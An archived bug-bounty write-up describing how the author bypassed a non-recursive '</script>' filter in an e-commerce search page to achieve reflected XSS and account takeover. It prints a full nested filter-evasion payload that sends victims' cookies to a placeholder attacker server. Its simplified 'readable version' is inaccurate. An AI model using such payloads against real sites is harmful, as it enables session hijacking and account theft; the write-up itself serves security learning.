# How I found Reflected XSS which leads to Account Takeover on an E-commerce website

- **Source URL:** https://medium.com/@npthin1804/how-i-found-reflected-xss-which-leads-to-account-takeover-on-an-e-commerce-website-47200dd631b6?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240308053940/https://medium.com/@npthin1804/how-i-found-reflected-xss-which-leads-to-account-takeover-on-an-e-commerce-website-47200dd631b6?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5495 (id 5495)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I found Reflected XSS which leads to Account Takeover on an E-commerce website

Hi everyone, I hope you are doing well. This is my first time writing a bug write-up. I’m so happy that after a long time reading blogs on Medium, I finally be able to have my own sharing. Although this bug is closed as Informative because Reflected XSS is out-of-scope as the program defined, I was able to takeover user’s account which is something I believe valuable if I share. Without further ado, let’s dive into the details.

Let’s say the website is [example.com.vn](https://web.archive.org/web/20240308053940/https://markdown-to-medium.surge.sh/example.com.vn). My approach is trying to discover as many functionalities as possible. For this program, I didn’t use any automation tools, instead, I manually tested the website to understand the logic flow. I tried CSRF, IDOR and other bugs but found no luck. Then I decided to inspect the search functionality. I started with some innocent searches such as: `<h1>Hello</h1>` and here's what i found

Then I tried to break out of the `<script>` tag and what server responded surprised me

I searched `%3C%2Fscript%3EHello%20there` which url-decoded is `</script>Hello there`. However, what the server responded in the response had no `</script>`. It means the server tried to remove the occurrence of the `</script>` tag. Then i used a trick which I learnt a long time ago to check if they recursively remove it. I tried to insert the `</script>` tag between each characters, `</s</script>c</script>r</script>i</script>p</script>t>Hello there`. And bump!!! I successfully broke out of the script tag, and the final payload I used to takeover accout was: `</s</script>cri</script>pt><img src="x" on</script>error=d</script>ocu</script>ment</script>.</script>loca</script>tion</script>.</script>h</script>ref='MY_SERVER?cookie='+do</script>cumen</script>t.c</script>ooki</script>e>`, which readable version is `</script><img src="x" onerror=document.href='MY_SERVER?cookie=document.cookie'>`

When users click on the link, they will be redirect to my server with their cookies and therefore i was able to steal their cookies and takeover their accounts.

I was on cloud nine when I could do it. Unfortunately, when I reported the bug, I noticed that Reflected XSS was out-of-scope, which made me feel disappointed. However, I tried my luck and write a report which was rejected by Hackerone triager and closed as Informative. Although this’s not a valid bug, I was happy because my learning effort was paid off. I had a lot of motivations after finding that bug. All I wanna tell you that let’s step into hacking today and you’ll learn something valuable. I hope I can find more bugs in the future to share with you guys. Last but not least, thanks for reading my blog, see you next time!!!
